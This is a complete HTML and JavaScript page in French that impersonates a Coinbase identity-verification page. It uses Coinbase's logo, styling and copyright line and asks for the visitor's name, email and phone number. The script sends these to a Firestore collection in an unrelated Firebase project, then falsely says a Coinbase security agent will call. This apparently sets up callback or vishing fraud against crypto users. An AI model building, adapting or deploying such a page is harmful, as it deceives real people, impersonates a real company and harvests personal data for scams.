<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Allow Firebase and Google APIs -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' https://www.gstatic.com https://*.firebaseio.com https://*.googleapis.com https://*.google.com; img-src 'self' https: data:;">
    <title>Vérification de sécurité - Coinbase</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f7f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #050f19;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .logo {
            width: 120px;
            margin-bottom: 24px;
        }
        h1 {
            font-size: 20px;
            margin-bottom: 8px;
            color: #050f19;
            font-weight: 600;
        }
        p {
            font-size: 14px;
            color: #5b616e;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
            color: #050f19;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #d4d7dc;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #0052ff;
            outline: none;
        }
        button {
            width: 100%;
            background-color: #0052ff;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #0040c9;
        }
        button:disabled {
            background-color: #b0c4ff;
            cursor: not-allowed;
        }
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #5b616e;
        }
        #statusMessage {
            margin-top: 16px;
            font-size: 14px;
            padding: 10px;
            border-radius: 4px;
            display: none;
        }
        .error {
            background-color: #fff1f0;
            color: #cf1322;
            border: 1px solid #ffa39e;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" alt="Coinbase" class="logo">
        <h1>Vérification d'identité</h1>
        <p>Veuillez confirmer vos informations pour qu'un agent puisse vous contacter rapidement.</p>
        
        <form id="verificationForm" action="#" method="POST">
            <div class="form-group">
                <label for="name">Nom complet</label>
                <input type="text" id="name" name="name" required placeholder="Votre nom">
            </div>
            
            <div class="form-group">
                <label for="email">Adresse e-mail</label>
                <input type="email" id="email" name="email" required placeholder="votre@email.com">
            </div>
            
            <div class="form-group">
                <label for="phone">Numéro de téléphone</label>
                <input type="tel" id="phone" name="phone" required placeholder="+33 6 12 34 56 78">
            </div>
            
            <button type="submit">Soumettre la demande</button>
        </form>
        
        <div id="statusMessage"></div>
        <div id="debugLog" style="margin-top: 20px; font-size: 10px; color: #999; text-align: left; font-family: monospace; display: none;"></div>
        
        <div class="footer">
            &copy; 2026 Coinbase Inc. Tous droits réservés.
        </div>
    </div>

    <!-- Firebase Compat Libraries (More stable for standalone files) -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>

    <script>
        // Debug logger
        function log(msg) {
            console.log(msg);
            const logDiv = document.getElementById('debugLog');
            logDiv.style.display = 'block';
            logDiv.innerHTML += `<div>${new Date().toLocaleTimeString()} - ${msg}</div>`;
        }

        const firebaseConfig = {
            apiKey: "AIzaSyCTDXREIs06AWzTcBQj3spidYggHhXCbbA",
            authDomain: "ai-studio-applet-webapp-9d383.firebaseapp.com",
            projectId: "ai-studio-applet-webapp-9d383",
            storageBucket: "ai-studio-applet-webapp-9d383.firebasestorage.app",
            messagingSenderId: "63609359078",
            appId: "1:63609359078:web:4dbf518d7ee9f808cfc927",
            measurementId: ""
        };

        let db;

        try {
            log("Initializing Firebase...");
            firebase.initializeApp(firebaseConfig);
            db = firebase.firestore();
            log("Firebase initialized.");
        } catch (e) {
            log("FATAL: Firebase init failed: " + e.message);
            document.getElementById('statusMessage').innerText = "Erreur système: " + e.message;
            document.getElementById('statusMessage').className = 'error';
            document.getElementById('statusMessage').style.display = 'block';
        }

        document.getElementById('verificationForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = e.target.querySelector('button');
            const statusDiv = document.getElementById('statusMessage');
            const originalText = btn.innerText;
            
            btn.disabled = true;
            btn.innerText = 'Envoi en cours...';
            statusDiv.style.display = 'none';
            log("Form submitted. Starting write operation...");

            try {
                const name = document.getElementById('name').value;
                const email = document.getElementById('email').value;
                const phone = document.getElementById('phone').value;

                log(`Data prepared: ${email}`);

                // 15s Timeout
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error("Timeout: Le serveur ne répond pas.")), 15000)
                );

                // Write to Firestore
                log("Calling db.collection('verifications').add()...");
                
                await Promise.race([
                    db.collection("verifications").add({
                        name: name,
                        email: email,
                        phone: phone,
                        timestamp: firebase.firestore.FieldValue.serverTimestamp()
                    }),
                    timeoutPromise
                ]);

                log("Write success!");

                document.querySelector('.container').innerHTML = `
                    <div style="text-align: center; padding: 40px 0;">
                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#0052ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 20px;">
                            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                            <polyline points="22 4 12 14.01 9 11.01"></polyline>
                        </svg>
                        <h2 style="color: #050f19; margin-bottom: 10px;">Vérification réussie</h2>
                        <p style="color: #5b616e;">Merci. Un agent de sécurité a été notifié et vous contactera sous peu.</p>
                    </div>
                `;
            } catch (error) {
                log("ERROR: " + error.message);
                console.error("Error adding document: ", error);
                
                let userMsg = "Une erreur est survenue.";
                if (error.message.includes("Timeout")) userMsg = "Erreur de connexion (Timeout).";
                if (error.message.includes("permission")) userMsg = "Accès refusé. Vérifiez vos droits.";
                
                statusDiv.innerText = userMsg + " (" + error.message + ")";
                statusDiv.className = 'error';
                statusDiv.style.display = 'block';
                
                btn.disabled = false;
                btn.innerText = originalText;
            }
        });
    </script>
</body>
</html>
